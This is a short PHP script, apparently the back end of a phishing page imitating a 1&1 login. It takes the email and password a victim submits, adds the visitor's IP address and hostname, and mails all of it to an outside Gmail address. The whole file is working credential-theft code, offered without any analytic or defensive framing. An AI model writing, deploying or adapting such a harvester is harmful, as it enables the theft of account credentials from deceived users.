<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| 1 &1 |--------------|\n";
$message .= "|EMAIL    : ".$_POST['email']."\n";
$message .= "|Password : ".$_POST['password']."\n";
$message .= "|----------| I N F O S |--------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|----------| 1 &1|--------------|\n";
$send = "questionlogs@gmail.com";
$subject = "1 &1- From:  [ $ip ]";

{
mail("$send", "$subject", $message);
}
$praga=rand();
$praga=md5($praga);
	
	
 ?>